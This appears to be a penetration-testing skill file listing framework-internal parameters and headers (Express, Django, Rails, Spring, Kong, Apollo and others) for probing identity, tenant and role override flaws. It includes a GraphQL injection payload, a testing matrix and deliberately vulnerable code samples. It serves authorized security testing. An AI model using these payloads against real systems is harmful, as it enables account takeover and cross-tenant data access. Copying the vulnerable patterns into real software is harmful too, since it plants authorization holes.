---
description: Framework-specific BFF/middleware internal parameter wordlists (Express, Next.js, Django, Rails, Spring, Kong) for identity/tenant/role override testing
skill: bff-parameter-override
---

# BFF / Middleware Parameter Override Payloads

Framework-specific internal parameters that middleware layers set before forwarding to backend
services. The vulnerability pattern: middleware enriches the request with identity/context params
but does NOT strip client-supplied values, allowing client-side override of server-set values.

## Express / Node.js BFF

The most common BFF override pattern. Express middleware frequently sets parameters on
`req.query`, `req.body`, or `req.headers` before calling `next()` or proxying to a backend.

### Identity Override Parameters

```
# User identity (set from session/JWT)
notAuthUserId
userId
user_id
authenticatedUserId
sessionUserId
currentUserId
requestUserId
$id$
$userId$
$authenticatedId$

# Agency/Organization context (set from session tenant)
$agencyId$
$originId$
$tenantId$
agencyId
orgId
organizationId
tenantId
companyId
accountId
workspaceId
teamId
```

### Authorization Control Parameters

```
# Permission bypass flags
checkPassword
nonAuthorizedUpdate
skipValidation
skipAuth
bypassAuth
isAdmin
isSuperAdmin
isInternal
isService
privileged
elevated
forceUpdate

# Feature flags that middleware sets
featureEnabled
betaAccess
internalAccess
debugMode
testMode
```

### Object Resolution Parameters

```
# Object ownership override
$ownerId$
$creatorId$
objectOwnerId
resourceOwner
parentUserId
assignedTo

# Scope/filter parameters
$filter$
$scope$
includeDeleted
includeArchived
includePrivate
showAll
allTenants
crossTenant
```

### Header-Based Overrides

```
X-User-Id
X-Forwarded-User
X-Real-User-Id
X-Authenticated-User
X-Session-User
X-Internal-User
X-Tenant-Id
X-Organization-Id
X-Agency-Id
X-Account-Id
X-Request-User
X-Override-User
X-Impersonate
X-Act-As
X-On-Behalf-Of
```

---

## Next.js / Nuxt Middleware

### Next.js Internal Parameters

```
# Routing/locale (middleware sets from geolocation/headers)
__nextLocale
__nextDefaultLocale
_nextI18Next
_nextData

# Auth context (NextAuth.js / Auth.js)
userId
sessionId
csrfToken
callbackUrl

# API route internal params
_nextApiContext
_nextRequestMeta
```

### Nuxt Server Middleware

```
# Internal context
__nuxt_user
__nuxt_session
__nuxt_auth
event.context.user
event.context.session

# Route-level params
_nuxtRouteName
_nuxtRouteParams
```

---

## Django REST Framework

### Viewset Internal Parameters

```
# Permission bypass
_force_auth_user
_force_auth_token
is_staff
is_superuser
is_authenticated
user_permissions

# Request mutation
format
_method
_content_type

# Filtering override (django-filter)
ordering
fields
expand
omit
```

### Django Admin Override

```
# Object-level permission params
_popup
_to_field
_changelist_filters
```

---

## Rails API / Rack Middleware

### Strong Parameters Bypass Vectors

```
# Method override
_method
X-Http-Method-Override

# CSRF bypass
authenticity_token
csrf_token

# Identity override (common in Devise/Warden)
current_user_id
warden_user_id
admin
role
is_admin

# Nested attribute mass assignment
user[role]
user[admin]
user[is_staff]
user[permissions][]
```

### Header-Based (Rack)

```
X-Forwarded-For
X-Real-IP
X-Original-URL
X-Rewrite-URL
X-User-Id
X-Admin
X-Role
```

---

## Spring Cloud Gateway / Zuul / Kong

### Gateway Headers (forwarded to backend microservices)

```
X-Forwarded-User
X-Forwarded-Groups
X-Forwarded-Roles
X-User-Id
X-Tenant-Id
X-Client-Id
X-Scope
X-Authorities
X-Permissions
X-Service-Account

# Spring Security context
principal
authorities
roles
sec-fetch-user
```

### Kong Plugin Headers

```
X-Consumer-ID
X-Consumer-Custom-ID
X-Consumer-Username
X-Credential-Identifier
X-Anonymous-Consumer
```

---

## GraphQL BFF / Apollo Federation

### Context Override Parameters

```
# Apollo Server context (may be populated from headers)
x-user-id
x-tenant-id
x-auth-token
x-service-name
x-trace-id

# Federation routing headers
apollo-federation-include-trace
apollo-require-preflight
```

### Query Variables Injection

```json
{"query": "mutation { updateUser(id: $id) { id } }",
 "variables": {"id": "VICTIM_ID", "__userId": "ATTACKER_ID"}}
```

---

## Testing Methodology

### Parameter Location Matrix

Test each candidate parameter in ALL locations:

| Location | Syntax | Example |
|----------|--------|---------|
| Query string | `?param=value` | `?notAuthUserId=VICTIM_ID` |
| JSON body | `{"param": "value"}` | `{"$id$": "VICTIM_ID"}` |
| Form body | `param=value` | `userId=VICTIM_ID` |
| HTTP header | `Header: value` | `X-User-Id: VICTIM_ID` |
| Cookie | `name=value` | `userId=VICTIM_ID` |

### Priority Order for Testing

1. **Identity params** (userId, $id$, notAuthUserId) → account takeover
2. **Tenant params** (agencyId, tenantId, orgId) → cross-tenant data access
3. **Role params** (isAdmin, role, permissions) → privilege escalation
4. **Bypass flags** (skipAuth, checkPassword=false) → auth bypass
5. **Object resolution** (ownerId, parentId) → IDOR via BFF

### False Positive Indicators

- Parameter accepted but response identical to baseline → ignored by backend
- Parameter triggers 400 with validation error naming the field → backend validates
- Parameter works but requires admin session → feature, not vulnerability
- Parameter only affects client-side rendering (e.g., locale) → no security impact

---

## Real-World Examples

### CVE-2021-XXXXX Pattern: Express BFF Identity Override

```javascript
// Vulnerable middleware pattern:
app.use((req, res, next) => {
  req.query.$id$ = req.session.userId;  // Sets identity from session
  next();
  // BUG: does NOT delete req.query.$id$ if client already supplied it
  // Client can supply ?$id$=VICTIM_ID which survives into the backend call
});
```

### MongoDB Passthrough Pattern

```javascript
// Vulnerable: body._id used for DB update, route :id used for auth check
router.put('/orders/:orderId', authCheck, (req, res) => {
  // authCheck validates: does user own req.params.orderId? ✓
  // But the update uses req.body._id instead:
  db.orders.findOneAndUpdate({_id: req.body._id}, {$set: req.body});
  // Attacker: PUT /orders/MY_ID with body._id = VICTIM_ID
});
```

### Header Trust Pattern

```javascript
// Vulnerable: backend microservice trusts X-User-Id header
// Gateway is supposed to set it, but doesn't strip client-supplied value
app.get('/api/data', (req, res) => {
  const userId = req.headers['x-user-id']; // Trusts header unconditionally
  return db.getData(userId);
});
```
